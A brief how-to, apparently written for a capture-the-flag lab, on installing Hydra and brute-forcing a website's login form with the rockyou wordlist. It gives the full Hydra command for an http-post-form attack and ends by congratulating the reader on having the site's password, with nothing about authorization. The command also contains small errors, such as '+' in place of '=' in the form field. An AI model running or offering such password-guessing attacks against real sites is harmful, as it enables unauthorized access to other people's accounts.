1) If you have not yet installed hydra or it's not already installed in your browser
   type "sudo apt install hydra" in your terminal.

2) Then to find the password of the site digit:
   "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <IP OF THE SITE(ex: 10.10.177.34)> http-post-form "/login:username=^USER^&password+^PASS^:Your username or password is incorrect."

3) When hydra has finished the operation the password will appear in blue in the terminal

Now you have the password of that site!👏👋
